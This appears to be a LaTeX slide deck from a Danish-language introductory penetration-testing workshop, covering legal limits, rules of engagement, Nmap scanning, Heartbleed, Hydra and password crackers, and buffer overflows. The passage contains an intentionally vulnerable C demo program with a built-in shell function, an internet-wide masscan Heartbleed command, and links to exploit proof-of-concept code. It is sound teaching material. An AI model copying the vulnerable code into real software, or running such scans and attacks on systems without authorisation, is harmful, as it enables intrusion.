\documentclass[Screen16to9,17pt]{foils}
\usepackage{zencurity-slides}

\begin{document}

%\slide{}

\mytitlepage
{Pentesting Networks Basics\\ Lær at tænke som en hacker}

\LogoOn


\slide{Time schedule}

\begin{list2}
\item 17:00 - 18:15\\
Introduction and basics
\item 30min break\\
Go eat with your family, hang around, get coffee


\item 18:45 - 19:30 45min\\

\item 19:30 - 19:45 15min break\\

\item 19:45 -20:30 45min\\
\item 20:30 - 21:00 Playtime, download Nmap and try it, if you want!
\end{list2}


\slide{Goals for today}
\vskip 2 cm

%{\hlkbig En 3 dages workshop, hvor du lærer at angribe dit netværk!}
\hlkimage{3cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introduce the term penetration testing and basic pentest methods
\item Introduce some of the basic tools in this genre of hacker tools
\item Give an insight into the process of doing security testing
\item Create an understanding of hacker tools
\item Show a hacker lab
\end{list1}


\slide{Hacker tools}

\begin{list1}
\item \emph{Improving the Security of Your Site by Breaking Into it}\\ by
Dan Farmer and Wietse Venema in 1993
\item Later in 1995 release the software SATAN\\
\emph{Security Administrator Tool for Analyzing Networks}
\item Caused some commotion, panic and discussions, every script kiddie can hack, the internet will melt down!
\vskip 5mm
\begin{quote}
We realize that SATAN is a two-edged sword -- like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN.
\end{quote}
\end{list1}

\vskip 1cm
Source:
\link{http://www.fish2.com/security/admin-guide-to-cracking.html}


\slide{Use hacker tools!}

\begin{list1}
\item Port scan can reveal holes in your defense
\item Web testing tools can crawl through your site and find problems
\item Pentesting is a verification and proactively finding problems
\item Its not a silverbullet and mostly find known problems in existing systems
\item Combined with honeypots they may allow better security
\end{list1}


\slide{Hacker -- cracker}

{\bfseries Short answer -- dont discuss this}

%Det lidt længere svar:\\
Yes, originally there was another meaning to hacker, but the media has perverted it and today, and since early 1990s it has meant breaking into stuff for the public

{\color{red}\hlkbig Today a hacker breaks into systems!}

Reference. Spafford, Cheswick, Garfinkel, Stoll, \ldots
- wrote about this and it was lost

Story is interesting and the old meaning is ALSO used in smaller communities, like hacker spaces full of hackers - doing fun and interesting stuff
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz
\end{list2}

\slide{Agreements for testing networks}

\begin{quote}\small
Danish Criminal Code\\
Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem.
\end{quote}

Hacking can result in:
\begin{list2}
\item Getting your devices confiscated by the police
\item Paying damages to persons or businesses
\item If older getting a fine and a record -- even jail perhaps
\item Getting a criminal record, making it hard to travel to some countries and working in security
\item Fear of terror has increased the focus -- so dont step over bounds!
\end{list2}

Asking for permission and getting an OK before doing invasive tests, always!


\slide{Why even do security testing?}

\begin{list1}
\item Lots of security problems
\item Pentesting may be a requirement from external partners -- example VISA PCI standard
\end{list1}

\begin{list2}
\item Boss asking: should we do a security test?
\item CIO: hmm, okay
\item IT Admins: *sigh* -- I know the security sucks in places!
\item Its not your systems -- dont take the criticism personal, but as an opportunity to get things improved
\end{list2}

\vskip 2cm
\centerline{\Large Many see the benefits after doing a pentest, so try it!}


\slide{Introduction -- terms and technologies}

\begin{list1}
\item Sikkerhedstest / penetrationstest\\
Afprøvning af sikkerhedsforanstaltninger og evaluering af
sikkerhedsniveau ved hjælp af IT systemer og \emph{hackerværktøjer}
\item Kaldes tillige sårbarhedstest, sårbarhedsanalyse m.v.
\item Ekstern -- udføres fra internet, typisk over WAN
\item Intern, inside, on-site -- udføres hos kunden, typisk over LAN og
  bag firewall
\end{list1}

\link{https://www.google.com/search?q=pentest}

\slide{Blackbox, greybox og whitebox}

\begin{list2}
\item Forudsætninger og forudgående kendskab til miljøet
\item {\bf Black Box} testen involverer en sikkerhedstestning af et netværk uden
nogen form for insider viden om systemet udover den IP-adresse, der
ønskes testet. Dette svarer til den situation en fjendtlig hacker vil
stå i og giver derfor det mest realistiske billede af netværkets
sårbarhed overfor angreb udefra. Men er dårlig ressourceudnyttelse.
\item {\bf White Box} testen. I dette tilfælde
har sikkerhedsspecialisten både før og under testen fuld adgang til
alle informationer om det scannede netværk. Analysen vil derfor kunne
afsløre sårbarheder, der ikke umiddelbart er synlige for en almindelig
angriber. En White Box test er typisk mere omfattende end en Black Box
test og forudsætter en højere grad af deltagelse fra kundens side, men
giver en meget detaljeret og tilbundsgående undersøgelse.

\item {\bf Grey Box} test er som navnet siger et kompromis mellem en White Box
og en Black Box test. Typisk vil sikkerhedsspecialisten udover en
IP-adresse være i besiddelse af de mest grundlæggende
systemoplysninger: Hvilken type af server der er tale om (mail-,
webserver eller andet), operativsystemet og eventuelt om der er
opstillet en firewall foran serveren.
\end{list2}


\slide{Benefits of having a planned security test done}

\begin{quote}
Goal of testing is to reduce risk for the systems and secure the organisation\\ from unexpected loss of data, image and increased costs.
\end{quote}

\begin{list1}
\item Target groups:
\begin{list2}
\item IT-department and technical staff
\item Management, owners, board of directors
\item External requirements insurance, auditors, VISA PCI DSS, the public
\end{list2}
\item Deliverables:
\begin{list2}
\item Report containing technical recommendations and summaries/checklist
\item Executive summary
\end{list2}
\end{list1}

Goal is not to find a scape goat to blame -- management allocates resources

If security is below expectations in places, more resources may be needed.


\slide{Persongalleri, Godkendelse og tilladelse}


\begin{list1}
\item Sikkerhedskonsulent -- den konsulent der tester
\item Inden en test kan udføres skal der indhentes tilladelser fra:
\begin{list2}
\item Systemejer -- den ansvarlige for et bestemt system
\item Netværksejer -- den ansvarlige for netværk hos kunden
\item Driftorganisation -- dem der driver systemerne
\item Sikkerhedsansvarlig -- den ansvarlige for sikkerheden hos kunden
\item Kontaktperson udpeges -- kundens ansatte som kan hjælpe med praktiske
  spørgsmål og skabe kontakt til de rette personer i kundens organisation
\end{list2}
\end{list1}

\slide{Planlægning af sikkerhedstest}

\begin{list1}
\item Sårbarhedsanalysens omfang aftales på forhånd
\begin{list2}
\item Scope -- hvad skal testes
\item Hvornår skal testes -- indenfor et aftalt tidsrum, wall clock time
\item Hvor testes fra -- logfilerne vil afsløre IP-adresser
\item Kan overskrides delvist -- eksempelvis ved port 80 scan på samme
  subnet eller tilsvarende
\item Skal der forsøges ude af drift angreb -- DoS
\item Se endvidere slide om Rules of engagement senere
\end{list2}
\item {\bf Sårbarhedsanalysen omfatter (targets):}
\begin{list2}
\item 192.168.1.1 -- firewall/router
\item 192.168.1.2 -- mailserver
\item 192.168.1.3 -- webserver
\item Testen udføres i tidsrummet mandag 1. til fredag 5.
\item Testere udfører \emph{angreb} fra 192.0.2.0/28
\end{list2}
\end{list1}


\slide{Udvælgelse af systemer til test}

\hlkimage{9cm}{overview-routing-customer-2015.png}

\begin{list2}
\item Routere på netværksvejen til kritiske systemer og netværk -
  tilgængelighed
\item Firewall -- begrænses trafikken tilstrækkeligt
\item Mailservere -- tillades relaying udefra, DMARC, SPF
\item Webservere -- kan der afvikles kode på systemet, downloades data
\item DNS setup -- autoritative servere på adskilte subnets, IPv4/IPv6, konfiguration
\end{list2}

\slide{Afbrydelse af testen -- kompromitterede maskiner}

\begin{list1}
\item Der kan være årsager der medfører at testen skal indstilles
\item Sikkerhedskonsulenten afbryder testen
\begin{list2}
\item Det anses for uforsvarligt at fortsætte, der er fundet
  kompromitterede systemer eller beviser der kan ødelægges
\item Netværket er dårligt, mulighederne for udførelse er forringet
\end{list2}
\item Kunden ønsker at afbryde testen
\begin{list2}
\item Der opleves for store problemer under udførelsen
\item Systemnedbrud på forretningskritiske systemer
\item Andre kriser der gør det valgte tidspunkt uegnet
\end{list2}
\item NB: Eksempler! -- man afbryder altid når kunden ønsker det!
\end{list1}

\slide{Oprydning efter testen}

\begin{list1}
\item Sikkerhedskonsulenten er ansvarlig for:
\begin{list2}
\item Fjerne data fra systemerne
\item Fjerne brugerkonti, få fjernet brugeroplysninger og
  loginmuligheder
\item Fjerne software som ikke skal benyttes mere
\end{list2}
\item Driftsorganisationen er ansvarlig for:
\begin{list2}
\item Undersøgelse af systemerne
\item Eventuel genstart af systemer, der kan være nedsat effektivitet
\item Fjerne patchkabler for stik der er kablet speciet til konsulenten
\end{list2}
\end{list1}

\slide{Afrapportering -- resultater}

\begin{list1}
\item Hvad indeholder en sikkerhedstest rapport:
\begin{list2}
\item Titel, indholdsfortegnelse, firmanavne -- ca. 15-30 sider for 5 hosts
\item Fortrolighedserklæring -- det er fortrolige oplysninger
\item Executive summary -- ofte i større virksomheder
\item Information om den udførte scanning
\item Omfang/scope
\item Gennemgang af targets -- detaljeret information og med anbefalinger
\item Konklusion -- ofte mere teknisk
\item Bilag -- detaljerede oplysninger og oversigter, checklister
\end{list2}
\item Det er organisationen der selv vælger hvilke anbefalinger der følges
\end{list1}


\slide{Rules of engagement -- regler og etik for sikkerhedstest}

\begin{list2}
\item NB: Stor forskel på Danmark og udlandet!
\item Sikkerhedskonsulenten må ikke give anledning til nye sårbarheder
  som følge af testen
\item Sikkerhedskonsulenten må ikke installere ny software på
  systemer uden forudgående aftale
\item Sikkerhedskonsulenten efterlader ikke usikre
  systemadministratorkonti eller tilsvarende efter testen
\item Sikkerhedskonsulenten tager altid kontakt til kunden ved
  høj-risiko sårbarheder
\item Er man hyret til netværkssikkerhed kan man godt \emph{snuse}
  lidt rundt om systemerne under test -- der kan være et sårbart
  testsystem lige ved siden af
\item Min holdning er at ved opdagelse af åbenlyse sikkerhedsrisici
  dokumenteres disse i rapporten, uanset scope for opgaven ellers
\end{list2}

\centerline{Det er en balancegang}



\slide{Konsulentens udstyr -- vil du være sikkerhedskonsulent}

\begin{list1}

\item Laptops, gerne flere, men én er nok til at lære!
\begin{list2}
\item Sikkerhedskonsulenterne bruger typisk Open Source værktøjer på Linux og
enkelte systemer med Windows
\item Netværkserfaring \emph{TCP/IP protocol suite} -- TCP, UDP, ICMP osv. i detaljer
\item Programmmeringserfaring er en fordel
\item Linux/Unix kendskab er ofte en {\bfseries nødvendighed}\\
- fordi de nyeste værktøjer er skrevet til Unix i form af Linux og BSD
\item \emph{A Hands-On Introduction to Hacking
by Georgia Weidman}, June 2014\\
 \link{http://www.nostarch.com/pentesting}
\item Metasploit Unleashed -- gratis kursus i Metasploit\\
\link{https://www.offensive-security.com/metasploit-unleashed/}
\end{list2}
\end{list1}


\slide{Books and educational materials}

\hlkimage{25mm}{LinuxBasicsforHackers_cover-front.png}

\begin{list2}
\item \emph{Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali}. OccupyTheWeb, December 2018, 248 pp. ISBN-13: 978-1-59327-855-7
\item \emph{Gray Hat Hacking: The Ethical Hacker's Handbook}, 5. ed. Allen Harper and others ISBN: 978-1-260-10841-5
\item \emph{The Art of Software Security Testing Identifying Software Security Flaws}, Chris Wysopal, 2006, ISBN: 9780321304865
\item \emph{Web Application Security}, Andrew Hoffman, 2020, ISBN: 9781492053118
\item \emph{Hacking, 2nd Edition: The Art of Exploitation}, Jon Erickson, February 2008, ISBN-13: 9781593271442
\end{list2}

{\footnotesize
I teach using these books! Diploma in IT-security at KEA Kompetence\\
 \link{https://zencurity.gitbook.io/kea-it-sikkerhed/netvaerkspenetrationstest/lektionsplan}}


\slide{Hackerlab opsætning}

\hlkimage{8cm}{hacklab-1.png}

\begin{list2}
\item Hardware: en moderne laptop med CPU der kan bruge virtualisering\\
 Husk at slå virtualisering til i BIOS
\item Software: dit favoritoperativsystem, Windows, Mac, Linux
\item Virtualiseringssoftware: VMware, Virtual box, vælg selv
\item Hackersoftware: Kali som Virtual Machine \link{https://www.kali.org/}
\item Soft targets: Metasploitable, Windows 2000, Windows XP, ...
\end{list2}


\slide{Kali Linux the pentest toolbox}

\hlkimage{14cm}{kali-linux.png}

\begin{list1}
\item  Kali \link{http://www.kali.org/}
\item 100.000s of videos on youtube alone, searching for kali and \$TOOL
\item Also versions for Raspberry Pi, mobile and other small computers
\end{list1}


\slide{Book: Kali Linux Revealed (KLR)}

\hlkimage{6cm}{kali-linux-revealed.jpg}

\emph{Kali Linux Revealed  Mastering the Penetration Testing Distribution}

\link{https://kali.training/}



\slide{Hacker tools}
% måske til reference afsnit?
\hlkimage{3cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Alle bruger nogenlunde de samme værktøjer, se også \link{http://www.sectools.org/}
\item Portscanner Nmap, Nping -- tester porte, godt til firewall admins \link{https://nmap.org}
\item Generel sårbarhedsscanner Metasploit Framework \link{https://www.metasploit.com/}
\item Specielle scannere -- wifi Aircrack-ng, web Burp suite, Nikto, Skipfish \link{http://portswigger.net/burp/}
\item Wireshark avanceret netværkssniffer -- \link{https://www.wireshark.org/}
\item og scripting, PowerShell, Unix shell, Perl, Python, Ruby, \ldots
\end{list2}

Billedet: Angelina Jolie fra Hackers 1995


\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection -- TCP/IP eller banner grab
\item Servicescan -- rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: Metasploit, Nikto, exploit programs
\item Oprydning/hærdning vises måske ikke, men I bør i praksis:
\begin{list2}
\item Lav en rapport
\item Ændre, forbedre og hærde systemer
\item Gennemgå rapporten, registrer ændringer
\item Opdater programmer, konfigurationer, arkitektur, osv.
\end{list2}
\item I skal jo også VISE andre at I gør noget ved sikkerheden.
\end{list1}





\slide{Teknisk hvad er hacking}

\hlkimage{12cm}{buffer-overflow-3.pdf}


\slide{Internet i dag}

\hlkimage{10cm}{images/server-client.pdf}

\begin{list1}
\item Klienter og servere
\item Rødder i akademiske miljøer
\item Protokoller der er op til 20 år gamle
\item Meget lidt kryptering, mest på http til brug ved e-handel
\end{list1}

\slide{Trinity breaking in}

\hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
Meget realistisk - sådan foregår det næsten:\\
\link{https://nmap.org/movies/}\\
\link{https://youtu.be/51lGCTgqE_w}



\slide{Hacking er magi}

\hlkimage{5cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking ligner indimellem  magi}


\slide{Hacking er ikke magi}

\hlkimage{15cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking kræver blot lidt ninja-træning}

\slide{Hacking eksempel -- det er ikke magi}

\begin{list1}
\item MAC filtrering på trådløse netværk
\item Alle netkort har en MAC adresse -- BRÆNDT ind i kortet fra fabrikken
\item Mange trådløse Access Points kan filtrere MAC adresser
\item Kun kort som er på listen over godkendte adresser tillades adgang til netværket

\item Det virker dog ikke \smiley
\item De fleste netkort tillader at man overskriver denne adresse midlertidigt
\item og man kan aflæse de godkendte når de er aktive på netværket
\item Derudover har der ofte været fejl i implementeringen af MAC filtrering
\end{list1}

\slide{Myten om MAC filtrering}

\begin{list1}
\item Eksemplet med MAC filtrering er en af de mange myter
\item Hvorfor sker det?
\item Marketing -- producenterne sætter store mærkater på æskerne
\item Manglende indsigt -- forbrugerne kender reelt ikke koncepterne
\item Hvad \emph{er} en MAC adresse egentlig
\item Relativt få har forudsætningerne for at gennemskue dårlig sikkerhed
\item Løsninger?

\item Udbrede viden om usikre metoder til at sikre data og computere
\item Udbrede viden om sikre metoder til at sikre data og computere
\end{list1}

\slide{MAC filtrering}

\hlkimage{12cm}{stupid-security.jpg}


\slide{OSI og Internet modellerne}

\hlkimage{10cm,angle=90}{images/compare-osi-ip.pdf}

\slide{Really do Nmap your world}

\hlkimage{8cm}{nmap-zenmap.png}

\begin{list2}
\item Nmap is a port scanner, but does more
\item Finding your own infrastructure available from the guest network?
\item See your printers having all the protocols enabled AND a wireless?
\end{list2}

\slide{Network mapping}

\hlkimage{13cm}{images/network-example.pdf}

\begin{list1}
\item Ved brug af traceroute og tilsvarende programmer kan man ofte
  udlede topologien i det netværk man undersøger
\item Levetiden (TTL) for en pakke tælles ned på hver router, sættes denne lavt
  opnår man at pakken \emph{timer ud} -- besked fra hver router på vejen
\item Default Unix er UDP pakker, Windows tracert ICMP pakker
\end{list1}


\slide{traceroute -- med UDP}

\begin{alltt}
\footnotesize # {\bfseries tcpdump -i en0 host 10.20.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 {\bf [ttl 1]}
23:23:30.426742 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 {\bf [ttl 1]}
23:23:30.436357 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 {\bf [ttl 1]}
23:23:30.437383 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router {\bf udp port 33438 unreachable}
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router {\bf udp port 33439 unreachable}
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router {\bf udp port 33440 unreachable}
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR?
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}


\slide{Basal Portscanning}

\begin{list1}
\item Hvad er portscanning
\item Afprøvning af alle porte fra 0/1 og op til 65535
\item Målet er at identificere åbne porte -- sårbare services
\item Typisk TCP og UDP scanning
\item TCP scanning er ofte mere pålidelig end UDP scanning
\item TCP handshake er nemmere at identificere, skal svare SYN
\item UDP applikationer svarer forskelligt -- hvis overhovedet\\
Svarer på rigtige forespørgsler, uden firewall svares ICMP på lukkede porte
\item Brug GUI programmet Zenmap mens i lærer Nmap at kende
\end{list1}


\slide{TCP three-way handshake}

\hlkimage{5cm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item Tidligere loggede systemer kun når der var etableret en fuld TCP
  forbindelse\\
  -- dette kan/kunne udnyttes til \emph{stealth}-scans
\item Hvis en maskine modtager mange SYN pakker kan dette fylde
  tabellen over connections op -- og derved afholde nye forbindelser
  fra at blive oprette -- {\bfseries SYN-flooding}
\end{list2}


\slide{Ping og port sweep}

\begin{list1}
\item Scanninger på tværs af netværk kaldes for sweeps
\item Scan et netværk efter aktive systemer med PING
\item Scan et netværk efter systemer med en bestemt port åben
\item Er som regel nemt at opdage:
  \begin{list2}
    \item konfigurer en maskine med to IP-adresser som ikke er i brug
\item hvis der kommer trafik til den ene eller anden er det portscan
\item hvis der kommer trafik til begge IP-adresser er der nok
  foretaget et sweep -- bedre hvis de to adresser ligger et stykke fra hinanden
  \end{list2}

\vskip 2cm
Pro tip: Hvis du leder efter et Netværks IDS, så kig på Suricata \link{suricata-ids.org}
\end{list1}

\slide{Nmap port sweep efter webservere}

\begin{alltt}\small
root@cornerstone:~#{\bfseries  nmap -p80,443 172.29.0.0/24}

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:31 CET
Nmap scan report for 172.29.0.1
Host is up (0.00016s latency).
PORT    STATE    SERVICE
{\color{darkgreen}80/tcp  open     http}
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00012s latency).
PORT    STATE  SERVICE
{\color{darkgreen}80/tcp  open   http}
443/tcp closed https
MAC Address: 00:0C:29:46:22:FB (VMware)

\end{alltt}

\slide{Nmap port sweep efter SNMP port 161/UDP}

\begin{alltt}\small
root@cornerstone:~#{\bfseries nmap -sU -p 161 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:30 CET
Nmap scan report for 172.29.0.1
Host is up (0.00015s latency).
PORT    STATE         SERVICE
{\color{darkgreen}161/udp open|filtered snmp}
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00011s latency).
PORT    STATE  SERVICE
{\bf{161/udp closed snmp}}
MAC Address: 00:0C:29:46:22:FB (VMware)
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.18 seconds
\end{alltt}

\slide{Nmap Advanced OS detection}
\begin{alltt}\footnotesize
root@cornerstone:~#{\bfseries nmap -A -p80,443 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:37 CET
Nmap scan report for 172.29.0.1
Host is up (0.00027s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.26 ((Unix) DAV/2 mod_ssl/2.2.26 OpenSSL/0.9.8zc)
|_http-title: Site doesn't have a title (text/html).
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)
Device type: media device|general purpose|phone
Running: Apple iOS 6.X|4.X|5.X, Apple Mac OS X 10.7.X|10.9.X|10.8.X
OS details: Apple iOS 6.1.3, Apple Mac OS X 10.7.0 (Lion) - 10.9.2 (Mavericks)
or iOS 4.1 - 7.1 (Darwin 10.0.0 - 14.0.0), Apple Mac OS X 10.8 - 10.8.3 (Mountain Lion)
or iOS 5.1.1 - 6.1.5 (Darwin 12.0.0 - 13.0.0)
OS and Service detection performed.
Please report any incorrect results at http://nmap.org/submit/
\end{alltt}

\begin{list2}
\item Lavniveau måde at identificere operativsystemer på, prøv også
  \verb+nmap -A+
\item Send pakker med \emph{anderledes} indhold, observer svar
\item En tidlig og detaljeret reference: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin, 2001 %\link{https://web.archive.org/web/20050210093427/http://www.sys-security.com/html/projects/icmp.html} % Original side er død
\end{list2}


\slide{Heartbleed CVE-2014-0160}

\hlkimage{19cm}{heartbleed-com.png}

Source: \link{http://heartbleed.com/}


\slide{Heartbleed hacking}

\begin{alltt}\footnotesize
  06b0: 2D 63 61 63 68 65 0D 0A 43 61 63 68 65 2D 43 6F  -cache..Cache-Co
  06c0: 6E 74 72 6F 6C 3A 20 6E 6F 2D 63 61 63 68 65 0D  ntrol: no-cache.
  06d0: 0A 0D 0A 61 63 74 69 6F 6E 3D 67 63 5F 69 6E 73  ...action=gc_ins
  06e0: 65 72 74 5F 6F 72 64 65 72 26 62 69 6C 6C 6E 6F  ert_order&billno
  06f0: 3D 50 5A 4B 31 31 30 31 26 70 61 79 6D 65 6E 74  =PZK1101&payment
  0700: 5F 69 64 3D 31 26 63 61 72 64 5F 6E 75 6D 62 65  _id=1&{\bf card_numbe}
  0710: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX  {\bf r=4060xxxx413xxx}
  0720: 39 36 26 63 61 72 64 5F 65 78 70 5F 6D 6F 6E 74  {\bf 96&card_exp_mont}
  0730: 68 3D 30 32 26 63 61 72 64 5F 65 78 70 5F 79 65  {\bf h=02&card_exp_ye}
  0740: 61 72 3D 31 37 26 63 61 72 64 5F 63 76 6E 3D 31  {\bf ar=17&card_cvn=1}
  0750: 30 39 F8 6C 1B E5 72 CA 61 4D 06 4E B3 54 BC DA  {\bf 09}.l..r.aM.N.T..
\end{alltt}

\begin{list2}
\item Obtained using Heartbleed proof of concepts -- Gave full credit card details
\item "Can XXX be exploited" -- yes, clearly! PoCs ARE needed\\
Without PoCs even Akamai wouldn't have repaired completely!
\item The internet was ALMOST fooled into thinking getting private keys\\
 from Heartbleed was not possible -- scary indeed.
\end{list2}

\slide{Proof of concept programs exist - god or bad?}

\centerline{Some of the tools released shortly after Heartbleed announcement}
\begin{list2}
\item \link{https://github.com/FiloSottile/Heartbleed} tool i Go\\
site \link{http://filippo.io/Heartbleed/}
\item \link{https://github.com/titanous/heartbleeder} tool i Go
\item \link{https://gist.github.com/takeshixx/10107280} test tool med STARTTLS support
\item \link{http://possible.lv/tools/hb/} test site
\item \link{https://twitter.com/richinseattle/status/453717235379355649} Practical Heartbleed attack against session keys links til, \link{https://www.mattslifebytes.com/?p=533} og "Fully automated here "\\ \link{https://www.michael-p-davis.com/using-heartbleed-for-hijacking-user-sessions/}

\item Metasploit er også opdateret på master repo\\ \link{https://twitter.com/firefart/status/453758091658792960}\\
\link{https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb}
\end{list2}


\slide{Scan for Heartbleed and SSLv2/SSLv3}

\hlkimage{6cm}{nmap-sslv2.png}

\begin{list1}
\item \verb+nmap -p 443 --script ssl-heartbleed <target>+\\
\link{https://nmap.org/nsedoc/scripts/ssl-heartbleed.html}
\item \verb+masscan 0.0.0.0/0 -p0-65535  --heartbleed+\\
\link{https://github.com/robertdavidgraham/masscan}
\end{list1}

\centerline{Almost every new vulnerability will have Nmap recipe}

\slide{Compare SSL}

\begin{minted}[fontsize=\footnotesize]{shell}

  /* Read type and payload length first */
    if (1 + 2 + 16 > s->s3->rrec.length)
        return 0; /* silently discard */
    hbtype = *p++;
    n2s(p, payload);
    if (1 + 2 + payload + 16 > s->s3->rrec.length)
        return 0; /* silently discard per RFC 6520 sec. 4 */
    pl = p;
\end{minted}

\begin{list2}
\item Ditch OpenSSL - write our own?
\item SSL implementations compared - above code from OpenSSL copied from this:\\
\link{http://tstarling.com/blog/2014/04/ssl-implementations-compared/}

\item Writing SSL software and other secure crypto software is hard
\item {\bf Configuring SSL is hard}\\
check you own site \link{https://www.ssllabs.com/ssltest/} or \verb+sslscan+ from Kali
\item SSL is hard, finding bugs \emph{all the time}
\end{list2}

\slide{September 2015: Heartbleed vulnerable servers}

\hlkimage{10cm}{heartbleed-vulnerab-2015-sept.png}

Source: Data from Shodan and Shodan Founder John Matherly


\slide{2016: Heartbleed vulnerable servers}

\hlkimage{17cm}{heartbleed-vulnerab-2016.png}

Source: Data from Shodan and Shodan Founder John Matherly
\link{https://www.shodan.io/report/89bnfUyJ}


\slide{Passwords vælges ikke tilfældigt}

\hlkimage{20cm}{50-most-used-passwords.png}

Source:
\link{https://wpengine.com/unmasked/}



\slide{Brute force}

\begin{list1}
\item Hvad betyder bruteforcing?\\
afprøvning af alle mulighederne
\end{list1}

\begin{alltt}\small
Hydra (c) by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME]
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...
\end{alltt}

\slide{Cracking passwords -- JtR and Hashcat}


\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords.
\end{quote}

\begin{list2}
\item Hashcat is the world's fastest CPU-based password recovery tool.
\item oclHashcat-plus is a GPGPU-based multi-hash cracker using a brute-force attack (implemented as mask attack), combinator attack, dictionary attack, hybrid attack, mask attack, and rule-based attack.
\item oclHashcat-lite is a GPGPU cracker that is optimized for cracking performance. Therefore, it is limited to only doing single-hash cracking using Markov attack, Brute-Force attack and Mask attack.
\item John the Ripper password cracker old skool men stadig nyttig
\end{list2}

Source:\\
\link{https://hashcat.net/wiki/}\\
\link{http://www.openwall.com/john/}


\slide{Buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen.
\item {\bfseries Stack protection}
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}

\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}

\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}



\slide{Hvordan finder man buffer overflow, og andre fejl}

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source betyder man kan læse og analysere koden
\item Source code review -- automatisk eller manuelt
\item Fejl kan findes ved at prøve sig frem -- fuzzing
\item Exploits virker typisk mod specifikke versioner af software
\end{list1}




\slide{Demo: Insecure programming buffer overflows 101}

Only if we have time!

\begin{list2}
\item Small demo program \verb+demo.c+
\item Has built-in shell code
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
the_shell()
\{  system("/bin/sh");  \}
\end{alltt}


\slide{GDB GNU Debugger}

\begin{list1}
